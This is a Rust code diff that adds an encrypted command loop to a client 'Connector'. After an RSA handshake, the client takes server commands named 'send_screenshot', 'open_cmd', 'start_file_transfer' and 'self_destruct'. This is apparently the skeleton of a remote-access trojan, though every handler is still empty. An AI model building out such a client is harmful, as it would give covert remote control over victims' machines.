@@ -93,6 +93,24 @@ impl Connector {
             }
         }
     }
+    pub async fn subscribe_to_updates(&mut self) {
+        loop {
+            if let Some(message) = self.read.as_mut().unwrap().next().await {
+                let decrypted_message = self.decrypt_data(message.unwrap().to_string().as_bytes());
+                match decrypted_message.as_str() {
+                    "update" => {}
+                    "start_file_transfer" => {}
+                    "send_screenshot" => {}
+                    "open_cmd" => {}
+                    "self_destruct" => {}
+                    _ => {
+                        println!("Got unrecognisible command, message:{}", decrypted_message)
+                    }
+                }
+            }
+        }
+    }
+
     pub async fn init_server(&mut self, message_str: &str) {
         if message_str == "pong" {
             let public_key_string = self
@@ -127,8 +145,9 @@ impl Connector {
             }
             self.public_key =
                 Some(RsaPublicKey::from_pkcs1_pem(server_public_key.as_str()).unwrap());
-
             println!("rsa init sequence complete");
+
+            self.subscribe_to_updates().await;
         }
     }
     pub async fn encrypt_data(&self, data: String) -> Vec<u8> {
